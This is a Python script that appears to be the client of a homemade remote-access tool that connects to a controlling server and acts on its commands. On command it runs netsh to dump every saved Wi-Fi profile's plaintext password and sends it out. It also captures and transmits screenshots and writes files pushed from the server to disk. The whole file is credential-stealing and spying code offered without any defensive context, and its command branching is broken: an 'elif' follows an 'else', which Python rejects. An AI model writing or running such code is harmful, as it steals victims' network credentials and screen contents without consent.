import socket
import subprocess
import pyautogui
import os

# Server configuration
server_host = '127.0.0.1'  # Use 'localhost' or the actual server's IP address
server_port = 12345

# Create a socket object
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to the server
client_socket.connect((server_host, server_port))

# Receive and display the response from the server
response = client_socket.recv(1024).decode('utf-8')
if response == "Run-wifi":
    data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
    profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
    for i in profiles:
        results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split('\n')
        results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
        try:
            wifi = ("{:<30}|  {:<}".format(i, results[0]))
            client_socket.send(wifi.encode("utf-8"))
        except IndexError:
            error =  ("{:<30}|  {:<}".format(i, ""))
elif response == "Run-ss":
    myScreenshot = pyautogui.screenshot()
    image_directory = 'Screenshot'  # Create a directory for the image
    if not os.path.exists(image_directory):
        os.makedirs(image_directory)
    image_file_path = os.path.join(image_directory, 'ss.png')  # Specify the path to save the image
    myScreenshot.save(image_file_path)
    try:
        with open(image_file_path, 'rb') as image_file:
            image_data = image_file.read()
            client_socket.send("Message is about to be sended".encode("utf-8"))
            client_socket.send(image_data)
    except FileNotFoundError:
        client_socket.send("Error".encode("utf-8"))
        pass
else:
    if response == "Run-upload":
        # Acknowledge the "Run-upload" command
        client_socket.send("Ready to receive".encode('utf-8'))
        
        # Start receiving the file
        print("Receiving a file...")
        file_extension = ""
        file_data = b""
        while True:
            data = client_socket.recv(1024)
            if not data:
                break
            if data.startswith(b"File is about to be sent"):
                file_extension = data[len(b"File is about to be sent"):].decode('utf-8')
            else:
                file_data += data
        
        # Specify the path where you want to save the received file
        file_path = f'received_file{file_extension}' if file_extension else 'received_file'
        with open(file_path, 'wb') as file:
            file.write(file_data)
        print(f"File received and saved as '{file_path}'.")
elif response == "Error: File not found":
    print("Server reports that the file is not found.")
# Close the client socket
client_socket.close()
